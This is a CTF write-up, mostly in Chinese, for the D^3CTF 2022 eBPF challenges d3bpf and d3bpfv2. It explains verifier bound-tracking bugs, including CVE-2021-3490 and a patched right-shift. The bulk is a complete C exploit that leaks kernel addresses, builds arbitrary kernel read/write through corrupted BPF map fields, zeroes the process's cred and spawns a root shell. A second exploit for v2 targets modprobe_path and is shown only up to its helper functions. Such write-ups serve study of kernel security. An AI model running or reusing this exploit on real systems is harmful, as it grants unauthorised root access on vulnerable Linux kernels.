# D^3CTF2022-d3bpf&v2


# d3bpf

## patch


```c
  case BPF_RSH:
    if (umin_val >= insn_bitness) {
            if (alu32)
                    __mark_reg32_known(dst_reg, 0);
            else
                    __mark_reg_known_zero(dst_reg);
            break;
    }
    if (alu32)
            scalar32_min_max_rsh(dst_reg, &src_reg);
    else
            scalar_min_max_rsh(dst_reg, &src_reg);
    break;
```

似乎在不同的架构上右移64的结果不一样，但是在本题中，右移64位会保持原值。
```c
gef➤  p/x 1>>64
$1 = 0x1
```
但是，verifier认为该值为0，以此造成边界检查错误。

## vuln

cve-2021-3490和patch的指令都可以利用，我这里使用cve-2021-3490。

构造verifier为0，runtime为1的寄存器。在构造成功后，利用步骤就和eebpf基本没有区别了。越界读取map的ops，leak内核地址。修改map->btf为目标地址，通过bpf_map_get_info_by_id进行任意地址读，搜索进程的task_struct。

在map内伪造虚表

- 劫持`map->map_ops`到提前构造的虚表

- 修改`map->type`为`BPF_MAP_TYPE_STACK`

- 修改`map->max_entries`为0xffffffff

- 修改`map->spin_lock_off`为0，以绕过其他的检查

- bpf_map_push_elem指针修改为array_map_get_next_key

调用BPF_MAP_UPDATE_ELEM即可任意地址写，修改当前进程的cred实现提取。

## exp

```c
      
#define _GNU_SOURCE
#include "bpf_insn.h"
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/bpf.h>
#include <linux/bpf_common.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <malloc.h>
#include <netinet/in.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/xattr.h>
#include <unistd.h>

#define PAGE_SIZE 4096

#define HELLO_MSG "I am Niebelungen, let me in!"
#define MSG_LEN 28

void die(const char *msg) {
  perror(msg);
  exit(-1);
}

int global_fd;
int control_map, read_map, write_map;
int reader_fd, reader_sock;
int writer_fd, writer_sock;
uint64_t kernbase;
uint64_t init_task;

int _bpf(int cmd, union bpf_attr *attr, uint32_t size) {
  return syscall(__NR_bpf, cmd, attr, size);
}

int create_map(int value_size, int cnt) {
  int map_fd;
  union bpf_attr attr = {.map_type = BPF_MAP_TYPE_ARRAY,
                         .key_size = 4,
                         .value_size = value_size,
                         .max_entries = cnt};

  map_fd = _bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
  if (map_fd < 0) {
    die("[!] Error creating map");
  }
  printf("[+] created map: %d\n\tvalue size: %d\n\tcnt: %d\n", map_fd,
         value_size, cnt);
  return map_fd;
}

int prog_load(struct bpf_insn *prog, int insn_cnt) {
  int prog_fd;
  char log_buf[0xf000];
  union bpf_attr attr = {
      .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
      .insn_cnt = insn_cnt,
      .insns = (uint64_t)prog,
      .license = (uint64_t) "GPL",
      .log_level = 2,
      .log_size = sizeof(log_buf),
      .log_buf = (uint64_t)log_buf,
  };

  prog_fd = _bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
  // printf("[+] log_buf: %s\nLOG_END\n", log_buf);
  if (prog_fd < 0) {
    die("[!] Failed to load BPF prog!");
  }
  return prog_fd;
}

int update_item(int fd, int idx, uint64_t value) {
  union bpf_attr attr = {
      .map_fd = fd,
      .key = (uint64_t)&idx,
      .value = (uint64_t)&value,
      .flags = BPF_ANY,
  };
  // printf("[+] update_item;\n\tmap_fd: %d\n\tidx: 0x%x\n\tvalue: 0x%lx\n", fd,
  // idx, value);
  return _bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

uint64_t get_item(int fd, uint64_t idx) {
  char value[0x800];
  uint64_t index = idx;
  union bpf_attr *attr = calloc(1, sizeof(union bpf_attr));
  attr->map_fd = fd;
  attr->key = (uint64_t)&idx;
  attr->value = (uint64_t)value;

  if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) < 0) {
    die("[!] Failed to lookup");
  }

  return *(uint64_t *)value;
}

uint32_t READ32(uint64_t target) {
  update_item(control_map, 0, 0);
  update_item(control_map, 1, target - 0x58);

  if (send(reader_sock, HELLO_MSG, MSG_LEN, 0) < 0) {
    die("[!] Failed to send HELLO_MSG");
  }

  struct bpf_map_info *info = calloc(1, sizeof(struct bpf_map_info));

  union bpf_attr push_attr = {
      .info.bpf_fd = read_map,
      .info.info_len = sizeof(*info),
      .info.info = (uint64_t)info,
  };
  if (_bpf(BPF_OBJ_GET_INFO_BY_FD, &push_attr, sizeof(push_attr)) < 0) {
    die("[!] Failed to get push");
  }
  return info->btf_id;
}

uint64_t READ64(uint64_t target) {
  uint64_t low = READ32(target);
  uint64_t high = READ32(target + 4);
  return low + (high << 32);
}

uint64_t leak_kernel() {
  int leak_fd;
  struct bpf_insn prog[] = {
      BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),           // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),   // key = [r2] = 0;
      BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),   // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                         // else exit

      // (1) r6: var_off = {mask = 0xFFFFFFFF00000000; value = 0x1}
      BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_0, 0), // r5 = *(u64 *)(r0 +0)
      BPF_MOV64_REG(BPF_REG_6, BPF_REG_5),          // r6 = r5
      BPF_LD_IMM64(BPF_REG_2, 0xFFFFFFFF),          // r2 = 0xFFFFFFFF
      BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32), // r2 <<= 32 0xFFFFFFFF00000000
      BPF_ALU64_REG(BPF_AND, BPF_REG_6,
                    BPF_REG_2), // r6 &= r2  高32位unknown, 低32位known为0
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_6,
                    1), // r6 += 1  {mask = 0xFFFFFFFF00000000, value = 0x1}

      // (2) r2: var_off = {mask = 0x0; value = 0x100000002}
      BPF_LD_IMM64(BPF_REG_2, 0x1),          // r2 = 0x1
      BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32), // r2 <<= 32         0x10000 0000
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2,
                    2), // r2 += 2  {mask = 0x0; value = 0x100000002}

      // (3) trigger the vulnerability
      BPF_ALU64_REG(BPF_AND, BPF_REG_6,
                    BPF_REG_2), // (5f) r6 &= r2         r6: u32_min_value=1,
                                // u32_max_value=0

      BPF_MOV64_IMM(BPF_REG_0, 0),
      // (4) u32_min_value = 0, u32_max_value = 1, var_off = {mask =
      // 0xFFFFFFFF00000001; value = 0x0}
      BPF_JMP32_IMM(BPF_JLE, BPF_REG_5, 1,
                    1), // (b6) if w5 <= 0x1 goto pc+1   r5: u32_min_value = 0,
                        // u32_max_value = 1, var_off = {mask =
                        // 0xFFFFFFFF00000001; value = 0x0}
      BPF_EXIT_INSN(),
      // (5) verifier:0  tuntime:1
      BPF_ALU64_IMM(
          BPF_ADD, BPF_REG_6,
          1), // (07) r6 += 1         r6: u32_max_value = 1, u32_min_value = 2,
              // var_off = {0x100000000; value = 0x1}
      BPF_ALU64_REG(BPF_ADD, BPF_REG_6,
                    BPF_REG_5), // (0f) r6 += r5      r6: verify:2   fact:1
                                // !!!!!!!!!!!!!!!!!!!!!!!
      BPF_MOV32_REG(BPF_REG_6, BPF_REG_6), // (bc) w6 = w6
      BPF_ALU64_IMM(BPF_AND, BPF_REG_6,
                    1), // (57) r6 &= 1       r6: verify:0   fact:1
      BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300), // r6 =0 (0x300)

      BPF_LD_MAP_FD(BPF_REG_1, read_map),      // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),             // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),    // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),   // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),     // key = [r2] = 0;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),   // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                         // else exit
      BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),
      BPF_MOV64_REG(BPF_REG_8, BPF_REG_0), // r8 = &array[0]

      BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x600),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
      BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, 0x110),

      BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0), // write address in array[0]
      BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_3, 0),

      BPF_MOV64_IMM(BPF_REG_0, 0), BPF_EXIT_INSN()

  };
  int insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
  // printf("[+] insn_cnt = %d\n", insn_cnt);
  leak_fd = prog_load(prog, insn_cnt);
  printf("[+] leak_fd = %d\n", leak_fd);
  int sockets[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) < 0) {
    die("[!] Failed in socketpair");
  }

  if (setsockopt(sockets[0], SOL_SOCKET, SO_ATTACH_BPF, &leak_fd,
                 sizeof(leak_fd)) < 0) {
    die("[!] Failed to attach BPF");
  }
  puts("[+] leak ATTACH_BPF");

  if (send(sockets[1], HELLO_MSG, MSG_LEN, 0) < 0) {
    die("[!] Failed to send HELLO_MSG");
  }
  uint64_t leak = get_item(read_map, 0);
  printf("[+] leak: 0x%lx\n", leak);

  return leak;
}

int copy_maps(uint64_t target) {
  uint64_t *maps = calloc(1, 0x700);
  for (int i = 0; i < 21; i++) {
    maps[i] = READ64(target + 8 * i);
  }
  maps[14] = maps[4];
  uint32_t idx = 0;
  union bpf_attr attr = {
      .map_fd = write_map,
      .key = (uint64_t)&idx,
      .value = (uint64_t)maps,
      .flags = BPF_ANY,
  };
  // printf("[+] maps[0]: 0x%lx\n", maps[0]);
  return _bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

void aaw2zero(uint64_t target) {
  uint64_t key = 0;
  uint64_t value = 0xffffffff;
  union bpf_attr *w_attr = calloc(1, sizeof(union bpf_attr));
  w_attr->map_fd = write_map;
  w_attr->key = (uint64_t)&key;
  w_attr->value = (uint64_t)&value;
  w_attr->flags = target;
  // sleep(5);
  if (_bpf(BPF_MAP_UPDATE_ELEM, w_attr, sizeof(*w_attr)) < 0) {
    die("[!] Error updating");
  }
}

void pop_shell() {
  if (!getuid()) {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    puts("[*] Root! :)");
    execve("/bin/sh", argv, envp);
  } else {
    die("[!] spawn shell error!\n");
  }
}

int main() {
  control_map = create_map(0x8, 10);
  read_map = create_map(0x700, 1);
  write_map = create_map(0x700, 1);

  update_item(control_map, 0, 0);
  update_item(control_map, 1, 0);
  update_item(read_map, 0, 0xdeadbeef);

  uint64_t leak = leak_kernel();
  kernbase = leak - 0x10363a0;
  printf("[+] kernbase: 0x%lx\n", kernbase);
  uint64_t array_map_ops = leak;
  printf("[+] array_map_ops: 0x%lx\n", array_map_ops);
  init_task = kernbase + 0x1a1a940;

  struct bpf_insn read_prog[] = {
      BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),           // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),   // key = [r2] = 0;
      BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),   // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                         // else exit

      // (1) r6: var_off = {mask = 0xFFFFFFFF00000000; value = 0x1}
      BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_0, 0), // r5 = *(u64 *)(r0 +0)
      BPF_MOV64_REG(BPF_REG_6, BPF_REG_5),          // r6 = r5
      BPF_LD_IMM64(BPF_REG_2, 0xFFFFFFFF),          // r2 = 0xFFFFFFFF
      BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32), // r2 <<= 32 0xFFFFFFFF00000000
      BPF_ALU64_REG(BPF_AND, BPF_REG_6,
                    BPF_REG_2), // r6 &= r2  高32位unknown, 低32位known为0
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_6,
                    1), // r6 += 1  {mask = 0xFFFFFFFF00000000, value = 0x1}

      // (2) r2: var_off = {mask = 0x0; value = 0x100000002}
      BPF_LD_IMM64(BPF_REG_2, 0x1),          // r2 = 0x1
      BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32), // r2 <<= 32         0x10000 0000
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2,
                    2), // r2 += 2  {mask = 0x0; value = 0x100000002}

      // (3) trigger the vulnerability
      BPF_ALU64_REG(BPF_AND, BPF_REG_6,
                    BPF_REG_2), // (5f) r6 &= r2         r6: u32_min_value=1,
                                // u32_max_value=0

      BPF_MOV64_IMM(BPF_REG_0, 0),
      // (4) u32_min_value = 0, u32_max_value = 1, var_off = {mask =
      // 0xFFFFFFFF00000001; value = 0x0}
      BPF_JMP32_IMM(BPF_JLE, BPF_REG_5, 1,
                    1), // (b6) if w5 <= 0x1 goto pc+1   r5: u32_min_value = 0,
                        // u32_max_value = 1, var_off = {mask =
                        // 0xFFFFFFFF00000001; value = 0x0}
      BPF_EXIT_INSN(),
      // (5) verifier:0  tuntime:1
      BPF_ALU64_IMM(
          BPF_ADD, BPF_REG_6,
          1), // (07) r6 += 1         r6: u32_max_value = 1, u32_min_value = 2,
              // var_off = {0x100000000; value = 0x1}
      BPF_ALU64_REG(BPF_ADD, BPF_REG_6,
                    BPF_REG_5), // (0f) r6 += r5      r6: verify:2   fact:1
                                // !!!!!!!!!!!!!!!!!!!!!!!
      BPF_MOV32_REG(BPF_REG_6, BPF_REG_6), // (bc) w6 = w6
      BPF_ALU64_IMM(BPF_AND, BPF_REG_6,
                    1), // (57) r6 &= 1       r6: verify:0   fact:1
      BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300), // r6 =0 (0x300)

      BPF_LD_MAP_FD(BPF_REG_1, control_map),        // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),                  // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),         // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),        // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),          // key = [r2] = 1;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),      // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),        // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                              // else exit
      BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // r7 = array[1]

      BPF_LD_MAP_FD(BPF_REG_1, read_map),      // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),             // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),    // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),   // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),     // key = [r2] = 0;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),   // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                         // else exit
      BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),     // r8 = &array[0]

      BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x600),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
      BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, 0x110 - 0x40), // r8 = &map->btf

      BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0), // overwrite btf to target

      BPF_MOV64_IMM(BPF_REG_0, 0), BPF_EXIT_INSN()};
  reader_fd = prog_load(read_prog, sizeof(read_prog) / sizeof(struct bpf_insn));
  printf("[+] reader_fd = %d\n", reader_fd);
  int sockets[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) < 0) {
    die("[!] Failed in socketpair");
  }
  if (setsockopt(sockets[0], SOL_SOCKET, SO_ATTACH_BPF, &reader_fd,
                 sizeof(reader_fd)) < 0) {
    die("[!] Failed to attach BPF");
  }
  puts("[+] Reader ATTACH_BPF");
  reader_sock = sockets[1];

  pid_t pid = getpid();
  printf("[+] self pid: %d\n", pid);

  // offset(task_struct, cred) = 0xad8
  // offset(task_struct, tasks) = 0x818 0x820
  // offset(task_struct, pid) =0x918
  // offset(map, btf) = 0x40
  // offset(map, spin_lock_off) = 0x2c
  // offset(btf, id) = 0x58
  puts("[+] searching task_struct...");
  uint64_t cur = init_task;
  for (;;) {
    cur = READ64(cur + 0x820) - 0x818; // cur = cur->next
    if (cur == init_task) {
      die("[!] task_struct not found");
    }
    pid_t cur_pid = READ32(cur + 0x918); // next->pid
    if (cur_pid == pid) {
      break;
    }
  }
  uint64_t cred = READ64(cur + 0xad8);
  printf("[+] task_struct: 0x%lx\n", cur);
  printf("[+] cred: 0x%lx\n", cred);

  assert(cred == READ64(cur + 0xad0));

  uint64_t files = READ64(cur + 0xb30);
  printf("[+] files: 0x%lx\n", files);
  //   sleep(10);
  uint64_t write_map_file = READ64(files + 0xa0 + 8 * write_map);
  uint64_t write_map_addr = READ64(write_map_file + 0xc8);
  printf("[+] write_map_addr: 0x%lx\n", write_map_addr);
  copy_maps(array_map_ops);
  READ64(write_map_addr + 0x110);
  // ffffffff8120e500 t array_map_get_next_key

  update_item(control_map, 0, 0);
  update_item(control_map, 1, write_map_addr + 0x110); // fake map ops

  struct bpf_insn writer_prog[] = {
      BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),           // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),   // key = [r2] = 0;
      BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),   // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                         // else exit

      // (1) r6: var_off = {mask = 0xFFFFFFFF00000000; value = 0x1}
      BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_0, 0), // r5 = *(u64 *)(r0 +0)
      BPF_MOV64_REG(BPF_REG_6, BPF_REG_5),          // r6 = r5
      BPF_LD_IMM64(BPF_REG_2, 0xFFFFFFFF),          // r2 = 0xFFFFFFFF
      BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32), // r2 <<= 32 0xFFFFFFFF00000000
      BPF_ALU64_REG(BPF_AND, BPF_REG_6,
                    BPF_REG_2), // r6 &= r2  高32位unknown, 低32位known为0
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_6,
                    1), // r6 += 1  {mask = 0xFFFFFFFF00000000, value = 0x1}

      // (2) r2: var_off = {mask = 0x0; value = 0x100000002}
      BPF_LD_IMM64(BPF_REG_2, 0x1),          // r2 = 0x1
      BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, 32), // r2 <<= 32         0x10000 0000
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2,
                    2), // r2 += 2  {mask = 0x0; value = 0x100000002}

      // (3) trigger the vulnerability
      BPF_ALU64_REG(BPF_AND, BPF_REG_6,
                    BPF_REG_2), // (5f) r6 &= r2         r6: u32_min_value=1,
                                // u32_max_value=0

      BPF_MOV64_IMM(BPF_REG_0, 0),
      // (4) u32_min_value = 0, u32_max_value = 1, var_off = {mask =
      // 0xFFFFFFFF00000001; value = 0x0}
      BPF_JMP32_IMM(BPF_JLE, BPF_REG_5, 1,
                    1), // (b6) if w5 <= 0x1 goto pc+1   r5: u32_min_value = 0,
                        // u32_max_value = 1, var_off = {mask =
                        // 0xFFFFFFFF00000001; value = 0x0}
      BPF_EXIT_INSN(),
      // (5) verifier:0  tuntime:1
      BPF_ALU64_IMM(
          BPF_ADD, BPF_REG_6,
          1), // (07) r6 += 1         r6: u32_max_value = 1, u32_min_value = 2,
              // var_off = {0x100000000; value = 0x1}
      BPF_ALU64_REG(BPF_ADD, BPF_REG_6,
                    BPF_REG_5), // (0f) r6 += r5      r6: verify:2   fact:1
                                // !!!!!!!!!!!!!!!!!!!!!!!
      BPF_MOV32_REG(BPF_REG_6, BPF_REG_6), // (bc) w6 = w6
      BPF_ALU64_IMM(BPF_AND, BPF_REG_6,
                    1), // (57) r6 &= 1       r6: verify:0   fact:1
      BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300), // r6 =0 (0x300)

      BPF_LD_MAP_FD(BPF_REG_1, control_map),        // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),                  // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),         // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),        // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),          // key = [r2] = 1;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),      // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),        // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                              // else exit
      BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // r7 = array[1]

      BPF_LD_MAP_FD(BPF_REG_1, write_map),     // r1 = map_fd
      BPF_MOV64_IMM(BPF_REG_0, 0),             // r0 = 0
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),    // r2 = rbp
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),   // r2 = fp -8
      BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),     // key = [r2] = 0;
      BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),   // jmp if(r0!=NULL)
      BPF_EXIT_INSN(),                         // else exit
      BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),     // r8 = &array[0]

      BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x600),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),
      BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6),

      BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, 0x110),     // r8 = &map->ops
      BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0), // overwrite ops to target

      BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x18), // r8 = &map->type
      BPF_ST_MEM(BPF_W, BPF_REG_8, 0, BPF_MAP_TYPE_STACK),

      BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x24 - 0x18), // r8 = &map->max_entries
      BPF_ST_MEM(BPF_W, BPF_REG_8, 0, 0xffffffff),

      BPF_ALU64_IMM(BPF_ADD, BPF_REG_8,
                    0x2c - 0x24), // r8 = &map->spin_lock_off
      BPF_ST_MEM(BPF_W, BPF_REG_8, 0, 0),

      BPF_MOV64_IMM(BPF_REG_0, 0), BPF_EXIT_INSN()};

  writer_fd =
      prog_load(writer_prog, sizeof(writer_prog) / sizeof(struct bpf_insn));
  printf("[+] writer_fd = %d\n", writer_fd);

  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) < 0) {
    die("[!] Failed in socketpair");
  }
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &writer_fd,
                 sizeof(writer_fd)) < 0) {
    die("[!] Failed to attach BPF");
  }
  puts("[+] Writer ATTACH_BPF");
  writer_sock = socks[1];

  if (send(writer_sock, HELLO_MSG, MSG_LEN, 0) < 0) {
    die("[!] Failed to send HELLO_MSG");
  }
  printf("[+] Now begin write\n");
  // ! Don't write too much
  for (uint32_t i = 0; i < 8; i++) {
    aaw2zero(cred + i * 4);
  }

  unsigned int ruid, euid, suid;
  setresuid(0, 0, 0);
  getresuid(&ruid, &euid, &suid);
  printf("[+] ruid: %u, euid: %u, suid: %u\n", ruid, euid, suid);

  pop_shell();

  return 0;
}
```

# d3bpfv2

v2同样patch了指令，但是运行在最新版本的内核中5.16.12。在最新的ebpf中加入了新的检测机制：

- 任何指针只能进行加减操作，不能进行比较（防止侧信道）
- 在进行指针与寄存器操作时，verfier会将已知的寄存器替换为常数进行计算。

这两条检查让verifier的边界计算错误几乎无法利用。

## vuln

我在这篇文章中找到了新的线索：https://www.openwall.com/lists/oss-security/2022/01/18/2，虽然该cve没有正式放出exp，但是作者说使用[bpf_skb_load_bytes](https://elixir.bootlin.com/linux/v5.16.12/C/ident/bpf_skb_load_bytes)可以进行绕过。无论如何，这让我将目光放在了map的帮助函数上。

**bpf_skb_load_bytes**:

```c
BPF_CALL_4(bpf_skb_load_bytes, const struct sk_buff *, skb, u32, offset,
	   void *, to, u32, len)
{
	void *ptr;

	if (unlikely(offset > 0xffff))
		goto err_clear;

	ptr = skb_header_pointer(skb, offset, len, to);
	if (unlikely(!ptr))
		goto err_clear;
	if (ptr != to)
		memcpy(to, ptr, len);

	return 0;
err_clear:
	memset(to, 0, len);
	return -EFAULT;
}
```

该函数读取socket的缓冲区到指定的位置，在ebpf程序中可以是栈，map等。

虽然verfier会检查我们读入的大小是否会影响栈中的指针，但是通过patch的指令可以很容易的绕过，从而越界写。

那么思路就是：

- 在栈中写入array的地址
- 调用该函数读取数据到array中
- 覆写array的地址
- 从栈中取出指针，并读取内容从而leak。

在得到内核地址后，可以使用相同的手法，完全修改栈上的指针，使其指向`modprobe_path`从而修改它，为任意的值。

开启了kalsr保护，我们修改栈中array指针时，并不能准确得到地址。但只要爆破4bit即可，概率很高。

## exp

```c
#define _GNU_SOURCE
#include <linux/bpf_common.h>
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <malloc.h>
#include <netinet/in.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/xattr.h>
#include <unistd.h>
#include "bpf_insn.h"

#define PAGE_SIZE 4096

#define BPF_MAP_TYPE_RINGBUF 27
#define BPF_skb_load_bytes 26
#define BPF_skb_load_bytes_relative 68

#define HELLO_MSG "\x00\x00am Niebelungen, let me in!"
#define MSG_LEN 28

void die(const char *msg)
{
    perror(msg);
    exit(-1);
}

int global_fd;
int control_map, read_map, write_map;
int reader_fd, reader_sock;
int writer_fd, writer_sock;
uint64_t kernbase, modprobe_path;
uint64_t init_task;
uint32_t guessed = 0;

int _bpf(int cmd, union bpf_attr *attr, uint32_t size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

int create_map(int value_size, int cnt)
{
    int map_fd;
    union bpf_attr attr = {.map_type = BPF_MAP_TYPE_ARRAY,
                           .key_size = 4,
                           .value_size = value_size,
                           .max_entries = cnt};

    map_fd = _bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
    if (map_fd < 0)
    {
        die("[!] Error creating map");
    }
    printf("[+] created map: %d\n\tvalue size: %d\n\tcnt: %d\n", map_fd,
           value_size, cnt);
    return map_fd;
}

int prog_load(struct bpf_insn *prog, int insn_cnt)
{
    int prog_fd;
    char log_buf[0xf000];
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = insn_cnt,
        .insns = (uint64_t)prog,
        .license = (uint64_t) "GPL",
        .log_level = 2,
        .log_size = sizeof(log_buf),
        .log_buf = (uint64_t)log_buf,
    };

    prog_fd = _bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    // printf("[+] log_buf: %s\nLOG_END\n", log_buf);
    if (prog_fd < 0)
    {
        die("[!] Failed to load BPF prog!");
    }
    return prog_fd;
}

